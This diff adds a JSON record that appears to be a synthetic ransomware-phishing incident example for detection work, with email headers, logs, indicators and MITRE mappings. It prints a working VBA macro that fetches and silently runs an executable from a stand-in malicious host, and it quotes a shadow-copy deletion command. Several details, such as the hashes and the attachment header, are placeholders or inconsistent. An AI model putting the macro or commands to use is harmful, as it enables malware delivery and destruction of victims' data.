@@ -1,0 +1,52 @@
+{
+  "examples": [
+    {
+      "scenario": "Phishing email with malicious invoice attachment delivering ransomware executable that installs and encrypts files on Windows endpoints.",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@invoicesecure-payments.com>\r\nReceived: from mail.invoicesecure-payments.com (mail.invoicesecure-payments.com [198.51.100.45])\r\n\tby mx.corpenterprise.com (Postfix) with ESMTPS id 1A2B3C4D5E\r\n\tfor <employee@corpenterprise.com>; Wed, 07 Jun 2023 14:23:45 +0000 (UTC)\r\nReceived-SPF: pass (mx.corpenterprise.com: domain of invoicesecure-payments.com designates 198.51.100.45 as permitted sender)\r\nAuthentication-Results: mx.corpenterprise.com; dkim=pass header.d=invoicesecure-payments.com; spf=pass smtp.mailfrom=billing@invoicesecure-payments.com; dmarc=pass\r\nMessage-ID: <20230607142345.12345@mail.invoicesecure-payments.com>\r\nFrom: \"Invoices Secure Payments\" <billing@invoicesecure-payments.com>\r\nTo: employee@corpenterprise.com\r\nSubject: Urgent: Invoice #INV-2023-4589 Attached\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_1234567_987654321.1686159825000\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Originating-IP: [198.51.100.45]\r\nX-Spam-Flag: NO\r\n",
+        "email_body": "------=_Part_1234567_987654321.1686159825000\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear Accounts Payable,\r\n\r\nPlease find attached the invoice for the recent order processed last month. Kindly review and process payment at your earliest convenience.\r\n\r\nRegards,\r\nInvoice Department\r\n\r\n------=_Part_1234567_987654321.1686159825000\r\nContent-Type: application/vnd.ms-word.document.macroEnabled.12; name=\"Invoice_INV-2023-4589.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Invoice_INV-2023-4589.docm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAA... (truncated base64 data, actual malicious macro payload)\r\n\r\n------=_Part_1234567_987654321.1686159825000--",
+        "smtp_transaction_log": "S: 220 mail.invoicesecure-payments.com ESMTP Postfix\r\nC: EHLO mail.corpenterprise.com\r\nS: 250-mail.invoicesecure-payments.com\r\nS: 250-PIPELINING\r\nS: 250-SIZE 10485760\r\nS: 250-ETRN\r\nS: 250-STARTTLS\r\nS: 250-ENHANCEDSTATUSCODES\r\nS: 250-8BITMIME\r\nS: 250 DSN\r\nC: MAIL FROM:<billing@invoicesecure-payments.com>\r\nS: 250 2.1.0 Ok\r\nC: RCPT TO:<employee@corpenterprise.com>\r\nS: 250 2.1.5 Ok\r\nC: DATA\r\nS: 354 End data with <CR><LF>.<CR><LF>\r\nC: [email data]\r\nS: 250 2.0.0 Ok: queued as 1A2B3C4D5E\r\nC: QUIT\r\nS: 221 2.0.0 Bye",
+        "attachment_hashes": {
+          "md5": "6f1c2d3e4b5a8def1234567890abcdef",
+          "sha1": "a3b4c5d6e7f89123456789abcdef0123456789ab",
+          "sha256": "3b8e4f7c9f1a2d3e4b5a6c7d8e9f0123456789abcdef0123456789abcdef0123"
+        },
+        "malicious_macro_vba_code": "Sub Document_Open()\r\n    Dim strURL As String\r\n    strURL = \"http://maliciousserver.net/payload.exe\"\r\n    Dim WinHttpReq As Object\r\n    Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\r\n    WinHttpReq.Open \"GET\", strURL, False\r\n    WinHttpReq.Send\r\n    If WinHttpReq.Status = 200 Then\r\n        Dim adoStream As Object\r\n        Set adoStream = CreateObject(\"ADODB.Stream\")\r\n        adoStream.Type = 1 'binary\r\n        adoStream.Open\r\n        adoStream.Write WinHttpReq.responseBody\r\n        adoStream.SaveToFile Environ(\"TEMP\") & \"\\update.exe\", 2\r\n        adoStream.Close\r\n        Shell Environ(\"TEMP\") & \"\\update.exe\", vbHide\r\n    End If\r\nEnd Sub",
+        "endpoint_artifacts": {
+          "created_files": [
+            "C:\\Users\\employee\\AppData\\Local\\Temp\\update.exe",
+            "C:\\Users\\employee\\Documents\\Encrypted\\README_DECRYPT.txt"
+          ],
+          "registry_changes": [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService = 'C:\\Users\\employee\\AppData\\Local\\Temp\\update.exe'"
+          ],
+          "process_tree": [
+            "explorer.exe (PID 4567)",
+            "winword.exe (PID 7890) - opened Invoice_INV-2023-4589.docm",
+            "update.exe (PID 8910) - ransomware payload executed by macro"
+          ]
+        },
+        "network_traffic_snippet": "12:45:33.123456 IP 192.168.1.45.49152 > 198.51.100.99.80: Flags [S], seq 123456789, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0], length 0\r\n12:45:33.223456 IP 198.51.100.99.80 > 192.168.1.45.49152: Flags [S.], seq 987654321, ack 123456790, win 28960, options [mss 1460,sackOK,TS val 987654 ecr 123456], length 0\r\n12:45:33.323456 IP 192.168.1.45.49152 > 198.51.100.99.80: Flags [P.], seq 1:515, ack 1, win 501, length 514\r\nGET /payload.exe HTTP/1.1\r\nHost: maliciousserver.net\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n\r\n",
+        "ransomware_behavior": "The update.exe binary drops multiple encrypted versions of user documents with '.locked' extension, deletes shadow copies (vssadmin.exe Delete Shadows /All /Quiet), and modifies registry to maintain persistence under HKCU Run key.",
+        "process_creation_command_line": "\"C:\\Users\\employee\\AppData\\Local\\Temp\\update.exe\" --encrypt --target \"C:\\Users\\employee\\Documents\""
+      },
+      "indicators": [
+        "Sender domain invoicesecure-payments.com registered 3 months ago via privacy-protected registrar",
+        "Attachment named Invoice_INV-2023-4589.docm with embedded VBA macro",
+        "Outbound HTTP request to http://maliciousserver.net/payload.exe from internal host",
+        "File hashes of update.exe match known ransomware MD5: 6f1c2d3e4b5a8def1234567890abcdef",
+        "Registry Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService pointing to temp executable",
+        "Network traffic showing HTTP GET to suspicious domain immediately after document opened"
+      ],
+      "detection_method": "Email gateway sandboxing and attachment scanning flagged macro-enabled DOCM with suspicious network activity. Endpoint protection detected anomalous process creation from Microsoft Word process. Network IDS signatures matched HTTP download of known ransomware payload. User reported encrypted files triggering incident response.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    }
+  ]
+}
